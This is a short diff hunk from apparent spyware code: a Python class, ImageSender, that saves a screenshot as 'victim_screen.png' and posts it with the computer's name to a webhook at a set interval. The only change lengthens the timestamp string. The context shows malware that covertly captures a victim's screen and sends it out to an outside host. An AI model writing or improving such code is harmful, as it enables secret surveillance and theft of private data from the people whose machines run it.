@@ -78,7 +78,7 @@ class ImageSender:
         bytes.seek(0)
         dfile = File(bytes, name="victim_screen.png")
 
-        date = str(datetime.datetime.now())[0:16]
+        date = str(datetime.datetime.now())[0:19]
 
         embed = Embed(description=f'New screenshot from {self.computer_name} [ {date} ]', color=0x5CDBF0, title=f'New Screenshot ({self.interval} seconds interval)')
         self.webhook.send(embed=embed, file=dfile)
